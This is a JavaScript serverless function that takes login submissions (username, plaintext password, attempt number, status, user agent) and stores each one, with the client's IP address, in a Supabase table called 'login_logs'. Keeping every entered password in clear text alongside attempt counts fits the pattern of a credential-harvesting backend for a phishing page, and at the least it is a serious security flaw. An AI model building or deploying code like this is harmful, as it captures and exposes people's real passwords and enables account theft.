import { createClient } from '@supabase/supabase-js';
import moment from 'moment';

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

export default async (req, context) => {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return new Response(JSON.stringify({ error: 'Method not allowed' }), {
      status: 405,
      headers: { 'Content-Type': 'application/json' },
    });
  }

  try {
    const { username, password, attemptNumber, status, timestamp, userAgent } = await req.json();
    
    // Get client IP
    const ipAddress = req.headers.get('x-forwarded-for') || 
                     req.headers.get('cf-connecting-ip') || 
                     'unknown';
    
    const logData = {
      timestamp: new Date(timestamp).toISOString(),
      username,
      password,
      attempt_number: attemptNumber,
      status,
      user_agent: userAgent,
      ip_address: ipAddress,
    };
    
    // Insert into Supabase
    const { error } = await supabase
      .from('login_logs')
      .insert([logData]);
    
    if (error) {
      console.error('Error saving to Supabase:', error.message);
      return new Response(
        JSON.stringify({ success: false, error: error.message }),
        { status: 500, headers: { 'Content-Type': 'application/json' } }
      );
    }
    
    console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
    
    return new Response(
      JSON.stringify({ success: true, message: 'Login attempt logged', stored: 'Supabase' }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Error logging login attempt:', error);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
};
